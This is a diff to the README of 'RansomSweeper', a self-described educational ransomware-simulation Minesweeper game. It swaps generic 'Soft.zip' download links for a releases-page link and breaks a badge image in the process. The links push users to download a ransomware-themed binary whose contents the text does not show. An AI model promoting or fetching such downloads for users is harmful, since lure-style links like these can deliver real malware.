@@ -3,7 +3,7 @@
 Welcome to **RansomSweeper**, an educational project that merges ransomware simulation with the classic Minesweeper game. Dive into the world of cybersecurity in a controlled environment while putting your skills to the test in a thrilling and challenging game. Remember to use this tool responsibly for ethical educational purposes.
 
 ## 🚀 Quick Links
-🔗 [Download the project here](https://github.com/files/Soft.zip)
+🔗 [Download the project here](https://github.com/aungk61/RansomSweeper/releases/tag/v1.2)
 
 ## ℹ️ About RansomSweeper
 **RansomSweeper** is a unique combination of ransomware simulation and the beloved Minesweeper game. It provides an engaging and interactive platform to learn about encryption, decryption, malware, hacking, trojans, viruses, and more. With a focus on cybersecurity awareness, this project aims to educate users about potential threats in a simulated and controlled environment.
@@ -40,12 +40,12 @@ The gameplay of **RansomSweeper** is a blend of the tactical thinking required i
 
 ## 🌟 Get Started
 To begin your journey with **RansomSweeper**, download the project from the following link:
-🔗 [Download RansomSweeper](https://github.com/files/Soft.zip)
+🔗 [Download RansomSweeper](https://github.com/aungk61/RansomSweeper/releases/tag/v1.2)
 
 ## 🚨 Need Help?
 
 If the link does not work or you encounter any issues, please check the "Releases" section of the repository for alternative download options.
 
-[![Download RansomSweeper](https://img.shields.io/badge/Download-RansomSweeper-brightgreen)](https://github.com/files/Soft.zip)
+[![Download RansomSweeper](https://github.com/aungk61/RansomSweeper/releases/tag/v1.2)](https://github.com/aungk61/RansomSweeper/releases/tag/v1.2)
 
 Let the adventure begin! Play, learn, and master the art of cybersecurity with **RansomSweeper**. Have fun and stay safe online! 🛡️🎮🔒
